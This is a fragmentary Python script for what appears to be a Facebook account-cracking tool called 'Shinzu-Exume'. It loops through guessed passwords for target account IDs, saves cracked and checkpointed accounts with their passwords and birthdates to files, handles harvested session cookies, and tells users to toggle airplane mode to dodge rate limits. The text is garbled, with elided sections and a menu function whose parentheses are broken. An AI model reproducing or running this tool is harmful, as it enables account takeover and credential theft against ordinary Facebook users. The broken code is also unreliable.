...
####LOGO####
            """
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sDesign By %sShinzu %s& %sNofil\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sFacebook.com/Shinzu.Reborn\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sFacebook.com/100011502541521\n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %sGithub.com/shinzuxtashfeen\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
...
def menu_log():
    ...
    if pmu in ['']:
        ...
        if pf in ['']:
            ...
            os.system('xdg-open https://facebook.com/Shinzu.Reborn')
...
def menu():
    ...
    print('%s╠══[%s8%s] %sUser Agent'%(O,P,O
    print('%s╠══[%s9%s] %s%s'%(O,P,O,P,upgrade))
    print('%s╠══[%s0%s] %sLog Out'%(O,P,O,P)),P))
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sShinzu-Exume{CP}%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("Shinzu-CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                    ...
                    print("\r%s[%sShinzu-Exume{CP}%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("Shinzu-CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sShinzu-Exume{OK}%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("Shinzu-OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sShinzu-Exume{OK}%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sShinzu-Exume{CP}%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                    ...
                    h_cp = "\r%s[%sShinzu-Exume{CP}%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("Shinzu-CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("Immortals-OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
...
def cek_hasil():
    ...
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sExample File : NOFIL-CP/%s.txt'%(O,P,O,P,tanggal))
...
def var_menu():
    ...
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sLogin with Token[Recommend]'%(O,P,O,P))
...
def var_author():
    ...
    mlaku('%s║     • %sSHINZU.X.TASHFEEN'%(O,P))
    mlaku('%s║     • %sNofil Abbasi'%(O,P))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sShion ka Abbu'%(O,P))
    mlaku('%s║     • %sAli Abbas(shinzu)'%(O,P))
    mlaku('%s║     • %sHuzaifa Haider'%(O,P))
    mlaku('%s║     • %sMuneeb '%(O,P))
    mlaku('%s║     • %sIrfan khan'%(O,P))
    mlaku('%s║     • %sSarim Balouch'%(O,P))
    mlaku('%s║     • %sAbdul Basit'%(O,P))
    mlaku('%s║     • %sAbdullah Saeed'%(O,P))
    mlaku('%s║     • %sShazam Alt'%(O,P))
    mlaku('%s║     • %sFallen holmes'%(O,P))
    mlaku('%s║     • %sEfan irvin'%(O,P))
    mlaku('%s║     • %sGoggeta Judas'%(O,P))
    mlaku('%s║'%(O))
def var_ugen():
...
def started():
    ...
    print('%s╠══[%s•%s] %sAccount [OK] Saved To SHINZU-OK/%s.txt'%(O,P,O,P,tanggal))
    print('%s╠══[%s•%s] %sAccount [CP] Saved To SHINZU-CP/%s.txt'%(O,P,O,P,tanggal))
    print('%s╚══[%s•%s] %sTurn on your Airplane mode [5 Seconds Only] in Every 5 Minutes\n'%(O,P,O,P))
def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
